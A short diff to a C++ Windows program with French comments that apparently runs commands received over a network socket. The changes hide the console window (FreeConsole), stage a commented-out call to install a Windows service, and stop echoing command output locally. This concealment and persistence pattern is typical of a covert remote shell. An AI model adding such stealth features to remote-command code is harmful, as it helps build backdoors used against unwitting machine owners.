@@ -42,6 +42,8 @@ void executeWindowsCommand(const std::string& cmd, std::string& output, std::str
 //FONCTION PRINCIPALE.
 int __cdecl main(void)
 {
+    //CreateService();  //Créer le service.
+    FreeConsole();  //Cacher la console.
     setlocale(LC_CTYPE, "fr-FR");  //Pour afficher les accents français.
 
     WSADATA wsaData;
@@ -621,6 +623,8 @@ void executeWindowsCommand(const std::string& cmd, std::string& output, std::str
         }
     }
 
-    //Afficher la sortie de la commande.
-    std::cout << output << std::endl;
+    if (output.empty())
+    {
+		output = "Aucune sortie.";
+	}
 }
